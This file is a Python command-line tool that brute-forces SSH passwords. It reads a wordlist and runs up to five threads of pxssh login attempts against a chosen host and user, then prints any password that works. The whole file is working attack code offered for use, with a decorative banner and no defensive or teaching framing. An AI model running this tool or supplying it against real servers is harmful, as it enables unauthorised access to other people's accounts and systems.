#!/usr/bin/env python3
from pexpect import pxssh
import optparse
import time
from threading import *

MAXCONNECTIONS = 5
CONNECTION_LOCK = BoundedSemaphore(value=MAXCONNECTIONS)
Found = False
Fails = 0

def print_logo():
    print("\033[35m ________  ___     ___    ___ ___   ___      ________  _______   ___      ___ \n|\\   __  \\|\\  \\   |\\  \\  /  /|\\  \\ |\\  \\    |\\   ___ \\|\\  ___ \\ |\\  \\    /  /|\n\\ \\  \\|\\  \\ \\  \\  \\ \\  \\/  / | \\  \\\\_\\  \\   \\ \\  \\_|\\ \\ \\   __/|\\ \\  \\  /  / /\n \\ \\   ____\\ \\  \\  \\ \\    / / \\ \\______  \\   \\ \\  \\ \\\\ \\ \\  \\_|/_\\ \\  \\/  / / \n  \\ \\  \\___|\\ \\  \\  /     \\/   \\|_____|\\  \\ __\\ \\  \\_\\\\ \\ \\  \\_|\\ \\ \\    / /  \n   \\ \\__\\    \\ \\__\\/  /\\   \\          \\ \\__\\\\__\\ \\_______\\ \\_______\\ \\__/ /   \n    \\|__|     \\|__/__/ /\\ __\\          \\|__\\|__|\\|_______|\\|_______|\\|__|/    \n                  |__|/ \\|__|\033[0m")

def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print(f'\033[32m[+] Password Found: {password}\033[0m')
        Found = True
    except Exception as e:
        print(e)
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host,user,password,False)
    finally:
        if release:
            CONNECTION_LOCK.release()

def main():
    print_logo()
    parser = optparse.OptionParser('usage portscanner: -H <target host> -u <user> -d <password list>')
    parser.add_option('-H', dest='Host',type='string',help='specify target host')
    parser.add_option('-u', dest='user',type='string',help='specify target user')
    parser.add_option('-d', dest='passwdFile',type='string',help='specify password file')
    (options,args) = parser.parse_args()
    host = options.Host
    user = options.user
    passwdFile = options.passwdFile
    if not host or not user or not passwdFile:
        print(parser.usage)
        exit(0)
    with open(passwdFile,'r') as f:
        for line in f:
            if Found:
                print(f'[*] Exiting: Password Found')
                exit(0)
            if Fails > 5:
                print(f'\033[31m[!] Exiting: Too many socket timeouts\033[0m')
                exit(0)
            CONNECTION_LOCK.acquire()
            password = line
            print(f'\033[31m[-] Testing: {password}\033[0m')
            t = Thread(target=connect, args=(host,user,password,True))
            child = t.start()

if __name__ == '__main__':
    main()
